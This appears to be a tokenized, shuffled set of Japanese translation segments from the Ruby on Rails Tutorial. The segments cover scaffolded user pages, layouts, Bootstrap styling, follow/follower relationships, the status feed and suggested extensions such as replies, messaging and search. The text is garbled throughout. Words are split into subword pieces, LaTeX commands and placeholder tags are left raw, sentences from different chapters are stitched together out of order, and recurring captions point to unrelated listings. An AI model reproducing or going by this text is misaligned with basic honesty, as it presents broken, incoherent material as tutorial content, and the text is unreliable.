▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁A p p ▁|
▁それでは 、\ ko de { home . html . erb } ビュー の コードを 、 {1}{2} リスト 3 . 28 {/2}{/1} のように 、 タイトル に含まれる " Home " という 文字 を 置き換え 、 動作 を 確認 しましょう 。
▁この 章では 、 他の ユーザーを フォロー ▁( および フォロー解除 ) ▁ できる ソ ー シ ャ ル レ イ ヤ ー を追加し 、 各 ユーザーの Home ページに 、 現在 フォロー 中 の ユーザーの ステータスフィード を 表示 できるように して 、 サンプルアプリケーションの コア を 完成 させ ます 。
▁また 、 自分 を フォローしているユーザー と 、 自分 が フォローしているユーザー を 同時に 表示 できるようにします 。
▁( これ で 、 HTML ビュー の ファイルの 拡張子 が \ ko de { . html . erb } と な っている 理由 を お わかり いた だけ た と思います )。
▁2 番 目 に 人 気 の テンプレート として \ href { http :// ha m l - lang . com /}{ H am l } があり ▁( 注意 : ▁" H A M L " ではありません ) ▁ 、 筆者 は 個 人 的に H am l の 方が 気 に 入 っています 。 残念ながら \ emph { 十分 に } 普 及 していない ため 、 初 級 者 向け チュートリアル の 採 用 は 見 送 り ました 。
▁ この節 で 説明 する アイディア の 多く は 、 最 初 な か な か 意 図 が 読み 取 れ ないこと も ある と思います 。 複雑な データモデル も 、 腑 に 落 ち る まで 時間 が か か ること でしょう 。
▁ も し 自分 が 混 乱 し 始 め ている と 感 じ たら 、 まず は この章 の最後 まで 進め 、 それ から もう一度 この章 全体 を 読み 返 してみてください 。 読み 返す ことで より よく 理解 できる と思います 。
▁Rails における デフォルトの 複数形 の 慣習 に 従 えば 、 ある ユーザーを フォロー している すべての ユーザーの 集合 は \ emph { followers } と なり 、\ ko de { user . followers } は それらの ユーザー の配列 を表す ことになります 。
▁これは もう リファクタリング して HTML の 重複 した 構造 を D R Y にする しか ない でしょう 。 ご 想 像 の とおり 、 Rails には そのため に \ emph { application . html . erb } という名前の \ ko de { レイアウト } ファイル があります 。 最 初 \ ref { sec : s li g h t ly _ d y n am i c _ pages } で この レイアウト ファイル の名前 を わざわざ 変え て お き ましたが 、 いよいよ 以下の コマンドで ファイル名 を 元に戻す ことにしましょう 。
▁さらに 、 この Relationship モデル には 今後 一意性 検証 を追加する 予定です 。 しかし 、 一意 インデックス を使用し ていれば リレーションシップ が 重複 したときに \ emph { 必ず } エラー になる ので 、 現時点では 一意 インデックス で 十分 です 。
▁\ ko de { relationships } テーブル を作成する ために 、 いつものように データベースの マイグレーション を 行 な って テスト データベース を 準備 しましょう 。
▁ フォローしているユーザー と フォロワー を実装する 前に 、 ユーザー と リレーションシップ の 関連付け を行います 。
▁このコードは リスト \ ref { code : user _ relationships _ association } で使用されていま した 。 もうひとつ 、
▁リスト \ ref { code : home _ root _ route } のコード に すると 、\ ko de { static _ pages / home } にアクセス しても 動作 し なくなります 。
▁ 「\ href { http :// de v center . heroku . com / articles / local - postgresql } { Heroku ▁in s tr u ct ions ▁for ▁ local ▁ PostgreSQL ▁install ation }」 には 、 PostgreSQL を ローカル 環境 に インストール する 手順 が 紹 介 されて ます 。
▁self を省略した 結果を リスト \ ref { code : Gemfile _ p g _ gem } に示します 。
▁さらに 、\ ko de { config / database . yml } ファイル と 、 PostgreSQL を ローカル 環境で 動作 させる 方法 を学ぶ 必要があります 。
▁self を省略した 結果を リスト \ ref { code : gitignore } に示します 。
▁ 以上 の 情報 を元に 、 PostgreSQL を使用して 開発 データベース と テスト データベース を作成し 、 それぞれ 設定 を行う ことが 、 この 課題 の ゴ ー ル です 。
▁ PostgreSQL データベース への 接続 と 内容 表示 には 、\ href { http :// in d u c tion app . com /}{ In d u c tion } という ツール が 便利です 。
▁ も し 行 き 詰 ま って し ま った ら 、 すぐ に この 演習 を 飛 ば して 次の 作業 に 進 んで ください 。 なお 、 既に 説明 した とおり 、 この チュートリアル で 開発 している サンプルアプリケーション は 、 SQLite と PostgreSQL の どちら についても 完全に 互 換 性 があります 。
▁ リレーションシップ という パ ズ ル の 最後の 一 片 は 、\ ko de { user . followers } メソッド を追加する ことです 。 これは 上の \ ko de { user . following } メソッドと 対 になります 。
▁ 実は 、\ ko de { follower _ id } と \ ko de { followed _ id } を 入 れ 替 え る だけで 、 フォロワー についても ユーザーの フォロー のとき と まったく 同じ 方法 が 使用できます 。 これは \ ko de { pass ive _ relationships } と \ ko de { active _ relationships } についても 同じです 。
▁ 一 点 、 リスト { p 0} で 注意 すべき 箇所 は 、 次のように 参 照 先 ▁( {2} followers {/2} ) ▁ を指定する ための {2} : source {/2} キー を省略 しても よ か った という 点 です 。
▁また 、 テスト ファイル だけで なく 、\ ko de { home . html . erb } ファイル が変更され ると \ ko de { static _ pages _ test . rb } が自動的に 実行される ように Guard を設定する こともできます 。
▁ 実は す で に 、 リスト { p 0} の {2} Gemfile {/2} で \ text tt { guard } ▁gem を アプリケーション 内に 取り 込 んで います 。 したがって 、 あ とは 初期化 する だけで 動か す ことができます 。
▁ 曖昧 さ の ない 「 フォローしているユーザー ▁( followed ▁ users )」 と 、 Twitter 式 の 「 フォロー している ▁( following )」 表示 を 両方 採 用 しました が 、 この ルーティング では 仕組み 上 残念ながら 曖昧 な 方 の ▁" following " ▁ を使用 せ ざ る を 得 ません 。
▁self を省略した 結果を リスト \ ref { code : following _ followers _ author i z ation _ test } に示します 。
▁ これはリスト \ ref { code : following _ followers _ tests } で使用されていま した 。
▁# ▁Ruby ▁on ▁Rails ▁ チュートリアル : サンプルアプリケーション
▁Ruby ▁on ▁Rails ▁3.2 ▁ チュートリアル
▁この ま まで も 支 障 はありません が 、 や は り このような 例外 には 頼 らない 方が よい ので 、 上で は ひ と 手 間 かけ て セキュリティ のための レ イ ヤ ー を追加し ました 。
▁ それ には まず 、 ド ル 記 号 ▁( $ ) ▁ を使用して D O M 要素 に 一意 の CSS ▁id で アクセス する 文法 について 知 る必要があります 。
▁ つ い に 、 サンプルアプリケーションの 山 頂 が 目 の 前に 現 れ ました 。 最後の 難 関 、 ステータスフィード の実装 に 取り か か り ましょう 。
▁ これはリスト \ ref { code : full _ feed _ test } で使用されていま した 。
▁self を省略した 結果を リスト \ ref { code : user _ feed } に示します 。
▁User モデルに 完全な フィード を追加する 。
▁ここで 行 いた い 選択 は 、 上 よりも もう少し 複 雑 で 、 たとえば 以下のような感じ になります 。
▁ 自動的に 以下のコード に置き換え られます 。
▁また 、 冒 頭 の \ ko de { Micropost . } が 省略 されている ことに も 注意 してください 。 このコード は Micropost モデル 自身 の 中 に置かれ る ことを前提とし ています 。 )
▁ それ以外の 追加 は 不要です 。
▁ 実 に ク ー ル だ と思います が 、 い か が でしょう か 。
▁つまり 、 ここでは 以下 を そのまま 使 えば よい だけ な のです 。
▁ これはリスト \ ref { code : from _ users _ followed _ by _ first _ c u t } で使用されていま した 。
▁\ ko de { from _ users _ followed _ by } の最初の 実装 。
▁ いくつかの アプリケーション において は 、 この 初期 実装 だけで 目的 が 達 成 され 、 十分 に 思える かもしれません 。 しかし リスト \ ref { code : from _ users _ followed _ by _ first _ c u t } に はまだ 足 り ない もの があります 。 それ が 何 な のか 、 次の 節 に進む前に 考え て みてください
▁このコードは 、 フォロー している \ emph { すべての } ユーザーを メモリ ー から 一 気 に 取り出し 、 フォローしているユーザー の 完全な 配列 を 作り 出 します 。
▁リスト \ ref { code : from _ users _ followed _ by _ first _ c u t } の 条件 では 、 集合 に 内 包 されている かどうか だけ しか チェック されていない ため 、 この 部分を もっと 効率 的な コード に できる はずです 。 そして 、 SQL は 本 来 このような 集合 の 操作 に 最適化 されています 。
▁リスト \ ref { code : from _ users _ followed _ by _ sec on d _ c u t } で コードを 若 干 修正 し 、 フィード を リファクタリング すること から 始 め ましょう 。
▁\ ko de { from _ users _ followed _ by } を 改良 する 。
▁# ▁ 与えられた ユーザーが フォローしているユーザー 達 の マイクロポスト を返す 。
▁ following
▁ following
▁ 必要な サブ セレクト を作成する ための 、 より 高度な 方法 については 、 「\ href { http :// p i v o t all a b s . com / users / js us s er / blog / articles / 5 6 7 - h ack ing - a - sub select - in - active record } { ActiveRecord の サブ セレクト を ハ ッ ク する } ▁( 英語 )」 という ブログ 記事 を参照してください 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁\ ko de { from _ users _ followed _ by } の 最終的な 実装 。
▁" Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁A p p ▁| ▁ Home "
▁リスト \ ref { code : from _ users _ followed _ by _ f in al } を も って 、 ステータスフィード の実装 は 完了 です 。
▁" Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁A p p ▁| ▁ About "
▁{0}{1} 第 11 章 {/1}{/0} では ただ の プロ ト タイプ で した が ▁( 図 \ ref { fig : home _ with _ proto _ feed }) 、 リスト \ ref { code : from _ users _ followed _ by _ f in al } の実装 によって 、 Home ページ で 完全な フィード が 表示 でき ている ことがわかります ▁( 図 \ ref { fig : home _ page _ with _ feed })。
▁ ステータスフィード が追加され 、\ emph { Ruby ▁on ▁Rails チュートリアル } の 中 心 となる サンプルアプリケーション が と う と う 完成 しました 。
▁これ だけで も かなり の 量 ですが 、 Rails について 学ぶ べ き こと はまだ まだ たくさん あります 。
▁ この節 で 提 案 する さまざまな 拡 張 ▁( パスワード リ マ イン ダ 、 メール による 確認 、 サンプルアプリケーション 向け には 検索 、 返 信 、 メッセージ ング など ) ▁ は 、 ほとんど が Web アプリケーションで 一般的な 機能 です 。
▁これらの 拡 張 を 1 つ か 2 つ でも 実装 してみる ことで 、 本書 から 巣 立 って 自分の アプリケーションを 書く ときに き っ と 役 に 立 つ ことでしょう 。
▁ い ざ 実装 し 始 め てみると 思 った より ず っ と 難 しく 感 じ る かもしれませんが 、 それ も 当 然 です 。 新しい 機能 という 真 っ 白 な キ ャ ン バ ス を 目 の 前に すれば 、 気 後 れ してしまう の も 無 理 はありません 。
▁ 皆 さ ん が 拡 張 を 始 め る に あ たり 、 さ さ や か ながら 私 から 2 つ ほど 一般的な ア ド バ イ ス を して み たい と思います 。
▁ 第 一 に 、 Rails アプリケーションに 何らかの 機能 を追加する ときに は 、 ぜ ひ \ href { http :// rails casts . com / e p is odes / ar ch ive } { RailsCast s ア ー カ イ ブ } を チェック してみてください 。 今 自分 が や ろ う と している ことは 、 既に Ryan ▁B at es が 取り上げ た トピック にある かもしれません
▁ RailsCast s では テスト を省略 している こと が多い ので 、 その 点 には 注意 してください 。 1 回 の エ ピ ソ ー ド を 短 く まとめ るために テスト を省略 している のですが 、 それ に 釣 られ て テスティング の 重要 性 を 軽 く 考え ること の ないように してください 。
▁ RailsCast で アイディア や ヒント を 得 たら 、 新 機能 の実装 は ぜ ひ とも テスト駆動開発 で 進め ること を お勧め いた します 。
▁( その 意味 でも 、 RailsCast 「\ href { http :// rails casts . com / e p is odes / 27 5 - h o w - i - test } { テスティング の 方法 } ▁( 英語 )」 を ぜ ひ 一度 参 照 してください 。
▁ Ryan ▁B at es 自身 も 、 現 実 には テスト駆動開発 を 採 用 している ことが 多く あります し 、 彼 の テスティング スタイル は 本書 の もの と 基本的に 同じです 。 )
▁ も し 手 頃 な トピック があれば 、 関連する RailsCast を ウ ォ ッ チ することで 、 時間 を 大 幅 に 節 約 できる ことでしょう 。
▁2 ) ▁ できる だけ 念 入 り に Google で 検索 し 、 自分 が 調 べ よう と している トピック に 言 及 している ブログ や チュートリアル がない かどうか 、 よく 探 す ことです 。
▁Web アプリケーションの 開発 には 常に 困 難 が つ き ま と います 。 他 人 の 経験 と 失敗 から 学ぶ ことも 重要です 。
▁以下の 機能 は ど れ も 難 易 度 が それ なり に 高 い ので 、 実装 に 必要となる か も し れ ない ツール について の ヒント も 書い て お き ました 。
▁ たとえ ヒント が あった として も 、 以下の 機能 が 本書 の 最 終 章 の 演習 よりも \ emph { ず っ と } 難 易 度 が 高 い ことは 変 わ り ません 。 相 当 頑 張 った にも か か わ らず 挫折 すること も 当 然 ある と思います ので 、 どう か そ ん な ときに は 落 ち 込 ま ない で ください 。
▁ Twitter には 、 マイクロポスト 入力 中に \ text tt {@ } 記 号 に 続けて ユーザーの ログイン 名 を入力する と その ユーザーに 返 信 できる 機能 があります 。
▁この ポ スト は 、 宛 先 の ユーザーの フィード と 、 自分 を フォローしているユーザー に のみ 表示 されます 。
▁この 返 信 機能 の 簡単な バージョン を 実装 してみましょう 。 具体的には 、 @ re p ly は 受信 者 の フィード と 送信 者 の フィード に のみ 表示される ようにします 。
▁これ を行う には 、\ ko de { microposts } テーブル の \ ko de { in _ re p ly _ to } カラム と 、 追加 の \ ko de { in c l u d ing _ re p l ies } スコープ を Micropost モデル に追加する 必要がある と お も います
▁この サンプルアプリケーション には 独自の ユーザー ログイン が ないので 、 ユーザーを 一意 に 表 す 方法 も 考え なければならない でしょう 。
▁1 つの 方法は 、 id と 名前 を 組み合わせ て \ ko de {@ 1 - michael - hartl } のように することです 。
▁ もう 1 つの 方法は 、 ユーザー登録 の 項目 に 一意 の ユーザー名 を \ emph { 追加 } し 、 @ re p l ies で 使えるように することです 。
▁ Twitter では 、 マイクロポストの 入力 時に 最初に ▁“ d ” ▁ キー を 押 す と ダ イ レ ク ト ▁( プ ラ イ ベ ート ) ▁ メッセージ を 行える 機能 が サポート されています 。
▁この 機能を サンプルアプリケーション に 実装 してみましょう 。
▁ ヒント は 、 M ess age モデルと 、 新 規 マイクロポスト に マッチする 正規表現 です 。
▁ フォロワー の 通知
▁ ユーザーに 新しく フォロワー が 増え たとき に メール で 通知 する 機能を 実装 してみましょう 。
▁続いて 、 メール で の 通知 機能を オプション として 選択 可能 に し 、 不要な 場合は 通知 をオフに できるように してみましょう 。
▁この 機能 を追加する には 、 Rails から メールを送信 する 機能を 追加する必要があります 。
▁最初に RailsCast 「\ href { http :// rails casts . com / e p is odes / 2 06 - action - mailer - in - rails - 3 } { Rails ▁3 の Action ▁Mailer }」 を参照してください 。
▁ パスワード リ マ イン ダ ー
▁ 現 状 の サンプルアプリケーション には 、 ユーザーが パスワードを 忘れ て し ま った とき の 復 旧 手 段 が ありません 。
▁ ユーザー登録 の 確認
▁ 現在の サンプルアプリケーション には 、 正規表現 による 最 小 限 の 確認 以外に 、 メールアドレスを 検証 する手段 が ありません 。
▁ ユーザー登録 時に メールアドレス を検証する 手順 を追加し てください 。
▁この 新 機能 では 、 ユーザー 作成 時に 「 仮 のユーザー アカウント 」 を作成し 、 ア ク テ ィ ベ ー ション 用の URL を メール で 送信 し 、 URL に ユーザーが アクセス した ら ユーザー アカウント を有効に する という 手順 が必要です 。
▁ユーザー アカウント を 有効 / 無効 に する方法について は 、 「\ href { http :// www . g oo g le . com / search ? q = state + ma ch in es + in + rails } { Rails ▁ ス テ ート マ シ ン }」 で ネ ッ ト を 検索 してみてください 。
▁ R S S フィード
▁ユーザー ご と の マイクロポストを R S S フィード する 機能を 実装 してください 。
▁次に ステータスフィード を R S S フィード する 機能 も 実装 し 、 余 裕 があれば フィード に 認 証 ス キー ム も 追加 して アクセス を 制限 してみてください 。
▁ ヒント については RailsCast 「\ href { http :// rails casts . com / e p is odes / 8 7 - g en er at ing - r s s - feed s } { R S S フィード の 生成 } ▁( 英語 )」 を参照してください 。
▁ REST ▁API
▁ 多くの Web サイト は API ▁( Application ▁ Pro gra m m er ▁ In ter fa ce ) ▁ を 公開 し ており 、 第 三 者 の アプリケーション から リソース の get / post / put / delete が 行える ようになっています 。
▁ サンプルアプリケーション にも このような REST ▁API を 実装 してください 。
▁ セキュリティ には 十分 注意 してください 。 認 可 された ユーザーに のみ API アクセス を 許可 する必要があります 。
▁ 現在の サンプルアプリケーション には 、 ユーザー インデックス ページを 端 から 探 す か 、 他の ユーザーの フィード を表示する 以外に 、 他の ユーザーを 検索 する手段 が ありません 。
▁この 点 を 強 化 するために 、 検索 機能を 実装 してください 。
▁続いて 、 マイクロポスト を検索する 機能 も 追加 してください 。
▁ あ ら か じ め RailsCast 「\ href { http :// rails casts . com / e p is odes / 3 7 - s im p le - search - form } { 簡単な 検索 フォーム } ▁( 英語 )」 を参照 しておく と よいでしょう 。
▁この アプリケーションを 共有 ホスト か 専 用の サーバー に 本番 展開 する のであれば 、\ href { http :// free la n c ing - g o d . github . com / t s / en /}{ T h in k ing ▁S ph in x } の 導入 を お勧め します ▁( RailsCast 「\ href { http :// rails casts . com / e p is odes /1 20 - th in k ing - s ph in x } { T h in k ing ▁S ph in x } ▁( 英語 )」 も 参 照 してください )。
▁ Heroku で 本番 展開 する のであれば 、 「\ href { http :// de v center . heroku . com / articles / full - text - search } { Heroku 全 文 検索 機能 }」 マ ニ ュ ア ル ▁( 英語 ) ▁ に従う 必要があります 。 ( 訳 注 : ▁@ b u do ug um i 06 17 ▁ さ ん が Rails ▁4.0 版 における [ S I M P L E _ S E A R C H _ F O R M ] を 公開 してくれ ました 。 T h x ! )
▁ 読 む に 値 する Rails 関連 の 書 籍 や ドキュメント は 書 店 や Web で い く ら でも 見つけ られます 。 正 直 、 あ まり の 多 さ に 閉 口 する ほど です 。
▁\ href { http :// rails la b . new re li c . com / sc al ing - rails } { S c al ing ▁Rails } 。 本書 \ emph { Ruby ▁on ▁Rails チュートリアル } では 、 残念ながら パ フ ォ ー マ ン ス ▁( 性 能 ) 、 最適化 、 ス ケ ー リ ング という テ ー マ については ほとんど 追 求 できません で した 、
▁ 幸 い 、 実際の Web サイト で 深 刻 な ス ケ ー リ ング の 問題 に 直 面 すること は ほとんど ありません 。 そして 、 純 粋 な Rails に 何 を追加して も 、 そこ には 最適化 の 余 地 が 生じる はずです 。
▁ も し パ フ ォ ー マ ン ス の 問題 が発生する ようなこと があれば 、\ href { http :// rails la b . new re li c . com / sc al ing - rails } { E n v y ▁ L a b s } の G re g g ▁P o ll ack が 著 した この \ href { http :// env y la b s . com /}{ S c al ing ▁Rails } シ リ ー ズ を参照 すること から 始 め る の が よいでしょう 。
▁ サイト 監 視 用 に \ href { http :// sc out app . com /}{ S c out } と \ href { http :// www . new re li c . com /}{ New ▁ Re li c } { p 2 } の 導入 を 検 討 すること も お勧め いた します 。
▁\ emph { new ▁ re li c } は 「 新しい 遺 跡 」 という ト ン チ の 効 いた ネ ー ミ ング ですが 、 この 会 社 の 創 立 者 である L e w ▁C ir n e の名前 の ア ナ グ ラ ム ▁( 文字 を 入 れ 替 え た もの ) ▁ で もあります 。
▁ ご 想 像 の とおり 、 ス ケ ー リ ング の 話 題 ▁( プロ フ ァ イ リ ング 、 キャッシュ 、 バ ッ ク グ ラ ウ ンド ジョブ など ) ▁ は RailsCast s でも た び た び 取り上げ られ ています 。
▁ これはリスト \ ref { code : micropost _ dependency _ test } で使用されていま した 。
▁ リファクタリング
▁ Content s
▁ これはリスト \ ref { code : home _ feed _ test } で使用されていま した 。
▁次に 、 Bundler で使用する \ ko de { Gemfile } ▁ を テキストエディタ で 編集 します 。 {1}{2} リスト 2.1 {/2}{/1} の内容 に 書き 換 え てください 。
▁なお 、 現在の \ ko de { Gemfile } に対応する バージョンの Rake が 確 実 に 実行される ように するために 、\ ko de { bundle ▁exec } を使用して \ ko de { rake } を実行します
▁たとえば 、\ href { http ://0.0.0.0:3000/ users }{/ users } を 表示 すれば すべての ユーザーの 一覧 が表示されます し 、\ href { http ://0.0.0.0:3000/ users / new }{/ users / new } を 表示 すれば 新規ユーザー 作成 ページ が表示されます 。
▁まずは ユーザーの 一覧 を表示する \ href { http ://0.0.0.0:3000/ users }{\ text tt { index } } ページ を見てみましょう 。 もちろん 、 この時点で はまだ ユーザー は 登録 されていません ▁( {2} {3} 図 2 . 4 {/3} {/2} )。
▁{0} 図 2 . 4 ▁{/0}{1} Users リソース ▁(\ href { http ://0.0.0.0:3000/ users }{/ users }) ▁ ページ の最初の 状態 {/1}
▁ ユーザーを 新規作成 するには 、\ href { http ://0.0.0.0:3000/ users / new }{\ text tt { 図 2 . 5 } } の {2} {3} new {/3} {/2} ページ を表示します
▁{0} 図 2 . 5 ▁{/0}{1} 新規ユーザー 作成 ページ ▁(\ href { http ://0.0.0.0:3000/ users / new }{/ users / new }) {/1}
▁ユーザー が作成され 、\ href { http ://0.0.0.0:3000/ users /1 }{\ text tt { 図 2 . 6 } } のように {2} {3} show {/3} {/2} ページ が表示されます
▁ここで 、 URL が \ href { http ://0.0.0.0:3000/ users /1 }{/ users /1 } と 表示 され ていることに注目してください 。 ご 想 像 の とおり 、 この 数字 \ ko de {1} は {2} {3} 図 2 . 2 {/3} {/2} の \ ko de { id } 属性 その ものです 。
▁{0} 図 2 . 6 ▁{/0}{1} ユーザー 表示 用の ページ ▁(\ href { http ://0.0.0.0:3000/ users /1 }{/ users /1 }) {/1}
▁今度は 、 ユーザー情報 を変更 するために \ href { http ://0.0.0.0:3000/ users /1/ edit }{\ text tt { edit } } ページを 表示 してみましょう ▁( {2} {3} 図 2 . 7 {/3} {/2} )。
▁{0} 図 2 . 7 {/0} ▁{1} ユーザー 編集 用の ページ ▁(\ href { http ://0.0.0.0:3000/ users /1/ edit }{/ users /1/ edit }) {/1}
▁ここで \ href { http ://0.0.0.0:3000/ users / new }{\ text tt { new } } ページに 戻 り 、 ユーザーを もう 1 人 作成 してみましょう 。 \ href { http ://0.0.0.0:3000/ users }{\ text tt { index } } ページ を表示し てみると 、\ ref { fig : demo _ user _ index _ two _ rails _ 3 } のように ユーザーが 追加 されています 。
▁{0} 図 2 .9{/0} ▁{1} 2 人 目 のユーザー が追加され た 一覧 ページ ▁(\ href { http ://0.0.0.0:3000/ users }{/ users }) {/1}
▁ 具体的には 、\ href { http ://0.0.0.0:3000/ users }{/ users } の index ページを ブラウザで 開 く という 典 型 的な 操作 を行う ときに 何 が 起 こ っている か を MVC ▁( {1}{2} 図 2.1 1 {/2}{/1} ) ▁ で説明します 。
▁\ ko de {@ } 記 号 で 始 ま る 変数 は Ruby では \ emph { インスタンス変数 } と 呼ばれ ます 。 ビューで は自動的に これらの インスタンス変数 を使用できます 。 この場合 、 {2} {3} リスト 2 . 7 {/3} {/2} の \ ko de { index . html . erb } ビュー は 、\ ko de {@ users } の 一覧 を 並 べ 、 1 行 ごとに HTML の 行 として 出力 します
▁ レイアウト が 整 え られ ていない 。
▁\ href { http ://0.0.0.0:3000/ microposts / new }{/ microposts / new } ページを ブラウザで 開 き 、 新しいマイクロポスト の 情報を 入力 して マイクロポストを いくつか 作成 してみましょう ▁( {1}{2} 図 2.1 2 {/2}{/1} )。
▁{0} 図 2.1 2 {/0} ▁{1} 新しいマイクロポスト の作成 ページ ▁(\ href { http ://0.0.0.0:3000/ microposts / new }{/ microposts / new }) {/1}
▁{0} 図 2.1 3 {/0} ▁{1} マイクロポストの index ページ ▁(\ href { http ://0.0.0.0:3000/ microposts }{/ microposts }) {/1}
▁ この章 には 多くの 話 題 が 盛 り 込 まれ ています が 、 一度 読 んだ だけで 理解 する 必要 は まったく ありません 。
▁これは 現在の レイアウト でも 、\ emph { ある 点 を 除 いて } 達 成 されています 。 も し ビュー の 1 つ から \ ko de { pro v id e } 呼び出し を削除する と 、 その ページ 固有の タイトル の代わりに 以下の タイトル が表示されます 。
▁ 基本 タイトル として は これ で 正しい のですが 、 末尾 に 余 分 な 縦 棒 \ ko de { | } が 残 って し ま っています 。
▁以下の コマンド を コマンドライン で 実行 し 、 Rails コンソール を 起動 しましょう 。
▁ただし 、 1 つ 重要な 違 い があります 。 Ruby は シ ング ル ク ォ ート 文字列 の中で は 式 展開 を行い ません 。
▁Web アプリケーション を作成する ときに 、 ユーザー インターフェイス の概要 を できる だけ 早 い う ち に 把 握 しておくこと が し ば し ば 有 用 です 。
▁ 第 一 段 階 として 、 サンプルアプリケーション に リンク と スタイル を追加する ために 、 サイトの レイアウト ファイル \ ko de { application . html . erb } ▁( リスト \ ref { code : application _ layout _ full _ title } で 登 場 ) ▁ に HTML 構造 を追加し 、 レイアウト ファイルを 更新 します 。
▁ 実は Ruby ▁1. 9 では 、 ハッシュの 要素 の 順序 が 入力 順 と同じ であることを 保 証 しています が 、 ハッシュ を 特定の 順序 に 依 存 して カウント する のは 得 策 ではありません 。
▁ ハッシュ では シンボル を キー として 使う ことが 一般的な ので 、 Ruby ▁1. 9 では このような 特殊な 場合 のための 新しい 記 法 を サポート しています 。
▁ 今後 登 場 する スタイル 要素 を 利用 できるように するために 、\ ko de { home . html . erb } ビュー に 特別な 要素 を いくつか 追加 します ( リスト \ ref { code : signup _ button })。
▁ わかりやすく するために 、 この タグ によって 生成される HTML を以下に示します
▁\ ko de { alt } 属性 は 、 画像 がない 場合に 代わりに 表示される 文字列 です 。 また 、 視 覚 障 害 のある ユーザーが 使用する ス ク リ ー ン リ ー ダ ー では 、 この 属性 が 読み 上 げ られ て そこ に 画像 がある ことが 示 されます 。
▁Rails では 幸 い にも 、 この 属性を 指定 せずに \ ko de { image _ tag } を 呼び出し た場合 は 、 画像 ファイル名 ▁( 拡張子 を 除 く ) ▁ を デフォルトの \ ko de { alt } 属性 として 自動的に 付 加 してくれます 。
▁ 実は 、 Ruby ▁ では 丸 括 弧 は 使用 しても し なくても 構 いません 。 以下の 2 つの 行 は 同 等 です 。
▁\ text tt { Gemfile } へ \ ko de { bootstrap - sass } を追加する
▁ 実は 、 ハッシュ が 関数 呼び出し の \ emph { 最後の } 引数 である 場合は 、 波 括 弧 を省略 できます 。 以下の 2 つの 行 は 同 等 です 。
▁self を省略した 結果を リスト \ ref { code : bootstrap _ config } に示します 。
▁ Asset ▁Pipeline 互 換 の 行 を追加する 。
▁この ディレクトリ 名 と ファイル名 は 、 どちら も 重要です 。
▁( 実際には 少し 余 裕 を 持 た せ て 7 8 列 に して あります ) ▁ 。
▁上のコードでは \ ko de { stylesheet _ link _ tag } 関数 を 2 つの 引数 で 呼 んで います 。 最初の 引数 である 文字列 は 、 スタイルシート への パス を 示 しています 。 次の 引数 である ハッシュ には 2 つの 要素 があり 、 最初の 要素 は メ デ ィ ア タイプ を 示 し 、 次の 要素 は \ href { https :// github . com / rails / turbolinks } { turbolinks } 機能を オン に しています
▁( Turbolinks の詳細については 、 本書 の 次の ド ラ フ ト 版 で説明します )。
▁\ ko de { header } タグ に \ ko de { n a v bar - fi x ed - to p } クラス が与えられ ている ので 、 これ に従って Bootstrap は ナビゲーション バー を ページ 上 部 に 固定 し 、 ナビゲーション バー の下に 余 白 を 置 いて 主 要 部分 から 分 離 します
▁ ファイル名 \ ko de { _ sh im . html . erb } の 前 の アンダースコア に 注目してください 。 この アンダースコア は 、 普 遍 的な パーシャル の 命 名 規 約 であり 、 また 、 一 目 見 た だけで ディレクトリ 中 の すべての パーシャル を 識 別 すること が 可能 になります 。
▁ も し 上の 例 が 少し 不 自 然 に 思える なら ば 、 勘 が 鋭 い と い え ます 。 という の も 、 これは わ ざ と 不 自 然 に 書いた からです 。
▁ JavaScript に 精 通 している 方 のために 補 足 すると 、 この 機能 は 組み込み クラスの プロ ト タイプ オブジェクト を使用して クラス を 拡 張 すること と似ています
▁( 読者 の \ href { http :// get s at is f action . com / railstutorial / to p i c s / adding _ method s _ to _ b u il t _ in _ classes _ com p ar able _ to _ us ing _ javascripts _ proto type _ object } { E ri k ▁ E l d r id g e } による 指 摘 に 感 謝 します )。
▁ このため 、 と に か く Web アプリケーションを 書 け るように なり たい 方は 、 最初に Rails を 学 び 、 次に Ruby を 学 んで から 再 び Rails に 戻 って く る ことをお勧めします 。
▁その 他の 変更 は リポジトリ に コミット しましょう 。
▁次に \ ko de { params } ハッシュ を作成し 、\ ko de { params [: f at her ]} は \ ko de { person 1 }、\ ko de { params [: m other ]} は \ ko de { person 2 } 、 そして \ ko de { params [: ch il d ]} は ▁\ ko de { person 3 } になる ように してください 。
▁Ruby ▁API ▁ の オンライン マ ニ ュ ア ル を見つけ て 、\ ko de { Hash } クラスの \ ko de { merge } メソッド について 読んで みてください 。
▁ これはリスト \ ref { code : contact _ page _ test } で使用されていま した 。
▁\ href { http ://0.0.0.0:3000/ sessions / new }{/ sessions / new } フォーム を 送信 すると 図 \ ref { fig : initial _ failed _ login _ rails _ 3 } のようになります 。
▁最初に 、 Home ページ と Help ページ へのリンク を持つ ヘッダー パーシャル \ ko de { _ header . html . erb } ▁( リスト \ ref { code : header _ partial _ links }) ▁ から 取り か か ります 。
▁ フ ッ ター パーシャル \ ko de { _ footer . html . erb } にも リンク があります 。 これらは About ページ と Contact ページ へのリンク です ▁( リスト \ ref { code : footer _ partial _ links })。
▁これで 、 レイアウト に {0}{1} 第 3 章 {/1}{/0} で作成した すべての 静的ページ へのリンク が できました 。 たとえば \ href { http ://0.0.0.0:3000/ about }{/ about } の場合は About ページ ▁( 図 \ ref { fig : about _ page }) ▁ に移動し ます 。
▁{0} 図 5 . 8 {/0} ▁{1} \ href { http ://0.0.0.0:3000/ about }{/ about } で 表示される About ページ {/1}
▁ ボタン を サインアップ ページに リンク する 。
▁{0} 図 5 .9{/0} ▁{1} \ href { http ://0.0.0.0:3000/ signup }{/ signup } で 表示される 新しい ユーザー登録ページ {/1}
▁ これはリスト \ ref { code : full _ title _ helper _ tests } で使用されていま した 。
▁\ ko de { full _ title } ヘルパー のテスト 。
▁\ href { http :// s i ver s . org } { D er e k ▁S i ver s } が 前 書き で 述 べ ている ように 、 本書 は 一 本 道 の スト ー リ ー で 構成 されて いて 、 最 初 から 最 後 まで 飛 ば さ ずに 読 む ことを前提とし ています 。
▁ 技術 書 を 飛 ば し 読み する の が 習慣 になっている 方 にとって は 少々 頭 の 切り 替 え が 必要 になる かもしれませんが 、 それ だけ の値 打 ち は 十分 に あります 。 ぜ ひ ト ラ イ してみてください 。
▁\ emph { Ruby ▁on ▁Rails チュートリアル } を T V ゲ ー ム に たとえ ると 、 あなた は 主 人 公 であり 、 各 章 を ク リ ア する たびに Rails 開発者 として レベル アップ して い く と 考え てください
